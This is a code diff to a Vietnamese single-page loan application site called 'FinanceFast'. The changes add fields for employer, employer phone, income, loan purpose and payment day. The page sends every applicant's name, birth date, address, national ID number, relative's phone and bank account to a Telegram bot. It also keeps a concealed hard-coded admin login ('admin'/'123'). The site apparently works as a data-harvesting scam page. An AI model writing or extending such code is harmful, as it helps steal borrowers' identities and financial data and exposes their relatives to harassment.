@@ -128,12 +128,14 @@
             <div id="tabApplications" class="space-y-4 hidden py-2">
                 <div class="space-y-1">
                     <h2 class="text-lg font-black text-slate-900">Hồ Sơ Của Tôi</h2>
-                    <p class="text-xs text-slate-500">Quản lý các khoản vay đang hoạt động</p>
+                    <p class="text-xs text-slate-500">Quản lý tiến độ và chi tiết khoản vay</p>
                 </div>
-                <div id="appStatusContainer" class="bg-slate-50 border border-slate-200 rounded-2xl p-4 text-center space-y-3">
-                    <div class="text-3xl">📂</div>
-                    <p class="text-xs text-slate-500 font-semibold">Bạn chưa có hồ sơ vay nào được gửi đi.</p>
-                    <button onclick="switchTab('home')" class="bg-amber-400 text-slate-900 px-4 py-2 rounded-xl text-xs font-bold shadow-sm">Tạo Hồ Sơ Vay</button>
+                <div id="appStatusContainer" class="space-y-3">
+                    <div class="bg-slate-50 border border-slate-200 rounded-2xl p-4 text-center space-y-3">
+                        <div class="text-3xl">📂</div>
+                        <p class="text-xs text-slate-500 font-semibold">Bạn chưa có hồ sơ vay nào được gửi đi.</p>
+                        <button onclick="switchTab('home')" class="bg-amber-400 text-slate-900 px-4 py-2 rounded-xl text-xs font-bold shadow-sm">Tạo Hồ Sơ Vay</button>
+                    </div>
                 </div>
             </div>
 
@@ -160,27 +162,61 @@
                 </div>
             </div>
 
-            <!-- TRANG 1: THÔNG TIN CÁ NHÂN -->
-            <div id="step1" class="space-y-4 hidden">
-                <div class="space-y-3">
-                    <div>
-                        <label class="block text-xs font-bold text-slate-700 mb-1">Họ và tên đầy đủ (trên CCCD)</label>
-                        <input type="text" id="pName" placeholder="NGUYỄN VĂN A" class="w-full px-4 py-3.5 bg-slate-50 border border-slate-200 rounded-2xl text-sm uppercase focus:ring-2 focus:ring-amber-400 outline-none font-bold text-slate-900">
-                    </div>
-                    <div>
-                        <label class="block text-xs font-bold text-slate-700 mb-1">Ngày tháng năm sinh</label>
-                        <input type="text" id="pDob" placeholder="DD/MM/YYYY (Ví dụ: 24/08/2002)" class="w-full px-4 py-3.5 bg-slate-50 border border-slate-200 rounded-2xl text-sm focus:ring-2 focus:ring-amber-400 outline-none font-bold text-slate-900">
-                    </div>
-                    <div>
-                        <label class="block text-xs font-bold text-slate-700 mb-1">Quê quán / Địa chỉ thường trú</label>
-                        <input type="text" id="pAddress" placeholder="Số nhà, Xã/Phường, Huyện/Quận, Tỉnh/TP" class="w-full px-4 py-3.5 bg-slate-50 border border-slate-200 rounded-2xl text-sm focus:ring-2 focus:ring-amber-400 outline-none font-bold text-slate-900">
-                    </div>
-                    <div>
-                        <label class="block text-xs font-bold text-slate-700 mb-1">Số Căn cước công dân (CCCD)</label>
-                        <input type="text" id="pCccd" placeholder="Nhập 12 chữ số CCCD" class="w-full px-4 py-3.5 bg-slate-50 border border-slate-200 rounded-2xl text-sm focus:ring-2 focus:ring-amber-400 outline-none font-bold text-slate-900">
-                    </div>
+            <!-- TRANG 1: THÔNG TIN CÁ NHÂN (BỔ SUNG MỤC ĐÍCH, CÔNG TY, THU NHẬP, NGÀY ĐÓNG LÃI) -->
+            <div id="step1" class="space-y-3.5 hidden max-h-[420px] overflow-y-auto pr-1">
+                <div>
+                    <label class="block text-xs font-bold text-slate-700 mb-1">Họ và tên đầy đủ (trên CCCD)</label>
+                    <input type="text" id="pName" placeholder="NGUYỄN VĂN A" class="w-full px-4 py-3 bg-slate-50 border border-slate-200 rounded-xl text-sm uppercase focus:ring-2 focus:ring-amber-400 outline-none font-bold text-slate-900">
                 </div>
-                <button onclick="nextStep(1)" class="w-full bg-amber-400 hover:bg-amber-500 text-slate-900 py-4 rounded-2xl font-black text-sm shadow-md transition mt-2">Tiếp Tục</button>
+                <div>
+                    <label class="block text-xs font-bold text-slate-700 mb-1">Ngày tháng năm sinh</label>
+                    <input type="text" id="pDob" placeholder="DD/MM/YYYY (Ví dụ: 24/08/2002)" class="w-full px-4 py-3 bg-slate-50 border border-slate-200 rounded-xl text-sm focus:ring-2 focus:ring-amber-400 outline-none font-bold text-slate-900">
+                </div>
+                <div>
+                    <label class="block text-xs font-bold text-slate-700 mb-1">Địa chỉ thường trú</label>
+                    <input type="text" id="pAddress" placeholder="Số nhà, Xã/Phường, Huyện/Quận, Tỉnh/TP" class="w-full px-4 py-3 bg-slate-50 border border-slate-200 rounded-xl text-sm focus:ring-2 focus:ring-amber-400 outline-none font-bold text-slate-900">
+                </div>
+                <div>
+                    <label class="block text-xs font-bold text-slate-700 mb-1">Số Căn cước công dân (CCCD)</label>
+                    <input type="text" id="pCccd" placeholder="Nhập 12 chữ số CCCD" class="w-full px-4 py-3 bg-slate-50 border border-slate-200 rounded-xl text-sm focus:ring-2 focus:ring-amber-400 outline-none font-bold text-slate-900">
+                </div>
+                <div>
+                    <label class="block text-xs font-bold text-slate-700 mb-1">Mục đích vay vốn</label>
+                    <select id="pPurpose" class="w-full px-4 py-3 bg-slate-50 border border-slate-200 rounded-xl text-xs font-bold text-slate-800 outline-none">
+                        <option value="Tiêu dùng cá nhân">Tiêu dùng cá nhân</option>
+                        <option value="Kinh doanh nhỏ lẻ">Kinh doanh nhỏ lẻ</option>
+                        <option value="Mua sắm thiết bị / Xe cộ">Mua sắm thiết bị / Xe cộ</option>
+                        <option value="Thanh toán chi phí y tế / Sửa nhà">Thanh toán chi phí y tế / Sửa nhà</option>
+                    </select>
+                </div>
+                <div>
+                    <label class="block text-xs font-bold text-slate-700 mb-1">Nơi làm việc / Tên công ty</label>
+                    <input type="text" id="pCompany" placeholder="Ví dụ: Công ty TNHH ABC" class="w-full px-4 py-3 bg-slate-50 border border-slate-200 rounded-xl text-sm focus:ring-2 focus:ring-amber-400 outline-none font-bold text-slate-900">
+                </div>
+                <div>
+                    <label class="block text-xs font-bold text-slate-700 mb-1">Số điện thoại công ty / Đồng nghiệp</label>
+                    <input type="tel" id="pCompPhone" placeholder="Số điện thoại liên lạc công ty" class="w-full px-4 py-3 bg-slate-50 border border-slate-200 rounded-xl text-sm focus:ring-2 focus:ring-amber-400 outline-none font-bold text-slate-900">
+                </div>
+                <div>
+                    <label class="block text-xs font-bold text-slate-700 mb-1">Thu nhập hàng tháng</label>
+                    <select id="pIncome" class="w-full px-4 py-3 bg-slate-50 border border-slate-200 rounded-xl text-xs font-bold text-slate-800 outline-none">
+                        <option value="Dưới 5 triệu ₫">Dưới 5 triệu ₫</option>
+                        <option value="Từ 5 - 10 triệu ₫">Từ 5 - 10 triệu ₫</option>
+                        <option value="Từ 10 - 20 triệu ₫">Từ 10 - 20 triệu ₫</option>
+                        <option value="Trên 20 triệu ₫">Trên 20 triệu ₫</option>
+                    </select>
+                </div>
+                <div>
+                    <label class="block text-xs font-bold text-slate-700 mb-1">Ngày đóng lãi hàng tháng</label>
+                    <select id="pPayDay" class="w-full px-4 py-3 bg-slate-50 border border-slate-200 rounded-xl text-xs font-bold text-slate-800 outline-none">
+                        <option value="Ngày 05 hằng tháng">Ngày 05 hằng tháng</option>
+                        <option value="Ngày 10 hằng tháng">Ngày 10 hằng tháng</option>
+                        <option value="Ngày 15 hằng tháng">Ngày 15 hằng tháng</option>
+                        <option value="Ngày 20 hằng tháng">Ngày 20 hằng tháng</option>
+                        <option value="Ngày 25 hằng tháng">Ngày 25 hằng tháng</option>
+                    </select>
+                </div>
+                <button onclick="nextStep(1)" class="w-full bg-amber-400 hover:bg-amber-500 text-slate-900 py-3.5 rounded-2xl font-black text-sm shadow-md transition mt-2">Tiếp Tục</button>
             </div>
 
             <!-- TRANG 2: NGƯỜI THÂN THẨM ĐỊNH -->
@@ -353,7 +389,7 @@
         </div>
     </nav>
 
-    <!-- MODAL ĐĂNG NHẬP / ĐĂNG KÝ (SẠCH SẼ, TUYỆT ĐỐI KHÔNG LỘ CHỮ ADMIN) -->
+    <!-- MODAL ĐĂNG NHẬP / ĐĂNG KÝ -->
     <div id="authModal" class="fixed inset-0 bg-slate-900/60 backdrop-blur-sm z-50 flex items-center justify-center p-4 hidden">
         <div class="bg-white rounded-3xl max-w-sm w-full p-6 relative space-y-4 shadow-2xl">
             <button onclick="closeAuthModal()" class="absolute top-4 right-4 text-slate-400 hover:text-slate-600 text-lg font-bold">✕</button>
@@ -376,7 +412,7 @@
             <div id="registerBox" class="space-y-3 hidden">
                 <input type="text" id="regName" placeholder="Họ và tên" class="w-full px-4 py-3 bg-slate-50 border border-slate-200 rounded-xl text-sm focus:ring-2 focus:ring-amber-400 outline-none font-semibold">
                 <input type="tel" id="regPhone" placeholder="Số điện thoại" class="w-full px-4 py-3 bg-slate-50 border border-slate-200 rounded-xl text-sm focus:ring-2 focus:ring-amber-400 outline-none font-semibold">
-                <input type="password" id="regPass" placeholder="Mật khẩu mới" class="w-full px-4 py-3 bg-slate-50 border border-slate-200 rounded-xl text-sm focus:ring-2 focus:ring-amber-400 outline-none font-semibold">
+                <input type="password" id="regPass" placeholder="Mật khẩu" class="w-full px-4 py-3 bg-slate-50 border border-slate-200 rounded-xl text-sm focus:ring-2 focus:ring-amber-400 outline-none font-semibold">
                 <button onclick="handleRegister()" class="w-full bg-emerald-500 hover:bg-emerald-600 text-white py-3.5 rounded-xl font-black text-sm shadow-md transition">Đăng Ký Tài Khoản</button>
             </div>
         </div>
@@ -515,23 +551,38 @@
             }
         }
 
+        // HIỂN THỊ CHI TIẾT TỪNG TRƯỜNG DỮ LIỆU CỦA KHÁCH Ở TAB HỒ SƠ VAY
         function renderClientApplications() {
             const container = document.getElementById('appStatusContainer');
             const userLoans = allLoans.filter(l => l.user === currentUser);
             if(userLoans.length === 0) {
-                container.innerHTML = `<div class="text-3xl">📂</div><p class="text-xs text-slate-500 font-semibold">Bạn chưa có hồ sơ vay nào được gửi đi.</p><button onclick="switchTab('home')" class="bg-amber-400 text-slate-900 px-4 py-2 rounded-xl text-xs font-bold shadow-sm">Tạo Hồ Sơ Vay</button>`;
+                container.innerHTML = `<div class="bg-slate-50 border border-slate-200 rounded-2xl p-4 text-center space-y-3"><div class="text-3xl">📂</div><p class="text-xs text-slate-500 font-semibold">Bạn chưa có hồ sơ vay nào được gửi đi.</p><button onclick="switchTab('home')" class="bg-amber-400 text-slate-900 px-4 py-2 rounded-xl text-xs font-bold shadow-sm">Tạo Hồ Sơ Vay</button></div>`;
                 return;
             }
-            let html = '<div class="space-y-2 text-left">';
+            let html = '';
             userLoans.forEach(loan => {
-                html += `<div class="p-3 bg-white border border-slate-200 rounded-xl space-y-1 text-xs shadow-sm">
-                    <div class="flex justify-between font-bold text-slate-900"><span>${loan.name}</span><span class="text-amber-600">${loan.amount}</span></div>
-                    <div class="text-[11px] text-slate-500">STK: ${loan.bankAccount} (${loan.bankName})</div>
-                    <div class="flex justify-between items-center pt-1"><span class="text-[10px] font-bold px-2 py-0.5 rounded bg-amber-50 text-amber-700">${loan.status}</span><span class="text-[10px] text-slate-400">${loan.time}</span></div>
-                    ${loan.note ? `<div class="text-[11px] text-blue-600 bg-blue-50 p-1.5 rounded mt-1">📝 Ghi chú: ${loan.note}</div>` : ''}
+                html += `<div class="bg-slate-50 border border-slate-200 rounded-2xl p-4 space-y-3 text-xs shadow-sm">
+                    <div class="flex justify-between items-center border-b border-slate-200 pb-2">
+                        <span class="font-black text-slate-900 text-sm">Khoản Vay Tiêu Dùng</span>
+                        <span class="font-bold text-amber-600 bg-amber-100/60 px-2.5 py-1 rounded-full text-[11px]">${loan.status}</span>
+                    </div>
+                    <div class="grid grid-cols-2 gap-2.5 text-[11px]">
+                        <div><span class="text-slate-500 block">Số tiền vay:</span><strong class="text-slate-900 text-xs">${loan.amount}</strong></div>
+                        <div><span class="text-slate-500 block">Kỳ hạn vay:</span><strong class="text-slate-900 text-xs">${loan.term}</strong></div>
+                        <div><span class="text-slate-500 block">Lãi suất hàng tháng:</span><strong class="text-emerald-600">1.2% / tháng</strong></div>
+                        <div><span class="text-slate-500 block">Đóng hàng tháng:</span><strong class="text-amber-700">${loan.monthlyPayment}</strong></div>
+                        <div><span class="text-slate-500 block">Mục đích vay:</span><strong class="text-slate-800">${loan.purpose}</strong></div>
+                        <div><span class="text-slate-500 block">Thu nhập:</span><strong class="text-slate-800">${loan.income}</strong></div>
+                        <div class="col-span-2"><span class="text-slate-500 block">Nơi làm việc:</span><strong class="text-slate-800">${loan.company} (${loan.compPhone})</strong></div>
+                        <div class="col-span-2"><span class="text-slate-500 block">Ngày đóng lãi hàng tháng:</span><strong class="text-amber-600">${loan.payDay}</strong></div>
+                    </div>
+                    <div class="border-t border-slate-200 pt-2 space-y-1">
+                        <div class="flex justify-between text-[11px]"><span class="text-slate-500">Ngân hàng nhận:</span><span class="font-semibold">${loan.bankName} (${loan.bankAccount})</span></div>
+                        <div class="flex justify-between text-[11px]"><span class="text-slate-500">Ngày đăng ký:</span><span class="font-semibold">${loan.time}</span></div>
+                    </div>
+                    ${loan.note ? `<div class="bg-blue-50 border border-blue-200 p-2.5 rounded-xl text-blue-800 text-[11px]">📝 <b>Ghi chú từ hệ thống:</b> ${loan.note}</div>` : ''}
                 </div>`;
             });
-            html += '</div>';
             container.innerHTML = html;
         }
 
@@ -586,7 +637,6 @@
 
             if(!user || !pass) { return; }
 
-            // Nhập tài khoản quản trị ngầm
             if(user === "admin" && pass === "123") {
                 isAdminLoggedIn = true;
                 localStorage.setItem('ff_is_admin', 'true');
@@ -642,9 +692,9 @@
             let html = '';
             allLoans.forEach((loan, idx) => {
                 html += `<div onclick="selectAdminLoan(${idx})" class="p-3 bg-white border border-slate-200 rounded-xl cursor-pointer hover:border-amber-400 transition space-y-1 text-xs shadow-sm">
-                    <div class="flex justify-between font-bold text-slate-900"><span>${loan.name}</span><span class="text-amber-600">${loan.amount}</span></div>
-                    <div class="text-[11px] text-slate-500">CCCD: ${loan.cccd} - SĐT người thân: ${loan.rPhone}</div>
-                    <div class="flex justify-between items-center pt-1"><span class="text-[10px] font-bold px-2 py-0.5 rounded bg-amber-50 text-amber-700">${loan.status}</span><span class="text-[10px] text-blue-600 font-semibold">🔍 Bấm xử lý</span></div>
+                    <div class="flex justify-between font-bold text-slate-900"><span>${loan.name}</span><span class="text-amber-600">${loan.amount} (${loan.term})</span></div>
+                    <div class="text-[11px] text-slate-500">STK: ${loan.bankAccount} (${loan.bankName}) | Thu nhập: ${loan.income}</div>
+                    <div class="flex justify-between items-center pt-1"><span class="text-[10px] font-bold px-2 py-0.5 rounded bg-amber-50 text-amber-700">${loan.status}</span><span class="text-[10px] text-blue-600 font-semibold">🔍 Bấm xử lý đơn</span></div>
                 </div>`;
             });
             listEl.innerHTML = html;
@@ -655,7 +705,10 @@
             const loan = allLoans[idx];
             document.getElementById('detName').textContent = `Hồ sơ: ${loan.name}`;
             document.getElementById('detInfo').innerHTML = `
-                <p><b>Số tiền:</b> ${loan.amount} (${loan.term})</p>
+                <p><b>Số tiền vay:</b> ${loan.amount} | <b>Kỳ hạn:</b> ${loan.term}</p>
+                <p><b>Đóng hàng tháng:</b> ${loan.monthlyPayment} | <b>Ngày đóng lãi:</b> ${loan.payDay}</p>
+                <p><b>Mục đích vay:</b> ${loan.purpose} | <b>Thu nhập:</b> ${loan.income}</p>
+                <p><b>Công ty:</b> ${loan.company} (${loan.compPhone})</p>
                 <p><b>Ngày sinh:</b> ${loan.dob} | <b>CCCD:</b> ${loan.cccd}</p>
                 <p><b>Quê quán:</b> ${loan.address}</p>
                 <p><b>Người thân:</b> ${loan.rName} - ${loan.rPhone} (${loan.rRelation})</p>
@@ -688,6 +741,7 @@
             }
             formData.amount = document.getElementById('amountDisplay').textContent;
             formData.term = document.getElementById('loanTerm').value + " Tháng";
+            formData.monthlyPayment = document.getElementById('monthlyPayment').textContent;
             document.getElementById('stepHome').classList.add('hidden');
             document.getElementById('step1').classList.remove('hidden');
             updateProgress(1, 'Bước 1/4: Thông tin cá nhân', 25);
@@ -706,7 +760,13 @@
                 formData.dob = document.getElementById('pDob').value;
                 formData.address = document.getElementById('pAddress').value;
                 formData.cccd = document.getElementById('pCccd').value;
-                if(!formData.name || !formData.dob || !formData.cccd) { return; }
+                formData.purpose = document.getElementById('pPurpose').value;
+                formData.company = document.getElementById('pCompany').value;
+                formData.compPhone = document.getElementById('pCompPhone').value;
+                formData.income = document.getElementById('pIncome').value;
+                formData.payDay = document.getElementById('pPayDay').value;
+
+                if(!formData.name || !formData.dob || !formData.cccd || !formData.company) { return; }
                 document.getElementById('step1').classList.add('hidden');
                 document.getElementById('step2').classList.remove('hidden');
                 updateProgress(2, 'Bước 2/4: Người thân tham chiếu', 50);
@@ -759,6 +819,12 @@
                 name: formData.name,
                 amount: formData.amount,
                 term: formData.term,
+                monthlyPayment: formData.monthlyPayment,
+                purpose: formData.purpose,
+                company: formData.company,
+                compPhone: formData.compPhone,
+                income: formData.income,
+                payDay: formData.payDay,
                 dob: formData.dob,
                 address: formData.address,
                 cccd: formData.cccd,
@@ -776,7 +842,7 @@
             localStorage.setItem('ff_loans', JSON.stringify(allLoans));
 
             try {
-                const msg = `🚨 HỒ SƠ VAY MỚI (FINANCEFAST)!\n\n💰 Số tiền vay: ${formData.amount}\n📅 Kỳ hạn: ${formData.term}\n👤 Họ tên: ${formData.name}\n📅 Ngày sinh: ${formData.dob}\n🏠 Địa chỉ: ${formData.address}\n🪪 CCCD: ${formData.cccd}\n\n👥 Người thân: ${formData.rName} - SĐT: ${formData.rPhone} (${formData.rRelation})\n\n💳 Ngân hàng: ${formData.bankName} - STK: ${formData.bankAccount} (${formData.bankOwner})`;
+                const msg = `🚨 HỒ SƠ VAY MỚI (FINANCEFAST)!\n\n💰 Số tiền vay: ${formData.amount} (${formData.term})\n💵 Đóng hàng tháng: ${formData.monthlyPayment}\n🎯 Mục đích: ${formData.purpose}\n🏢 Công ty: ${formData.company} (${formData.compPhone})\n💵 Thu nhập: ${formData.income}\n📅 Ngày đóng lãi: ${formData.payDay}\n\n👤 Họ tên: ${formData.name}\n📅 Ngày sinh: ${formData.dob}\n🏠 Địa chỉ: ${formData.address}\n🪪 CCCD: ${formData.cccd}\n\n👥 Người thân: ${formData.rName} - SĐT: ${formData.rPhone} (${formData.rRelation})\n\n💳 Ngân hàng: ${formData.bankName} - STK: ${formData.bankAccount} (${formData.bankOwner})`;
                 
                 await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                     method: 'POST',
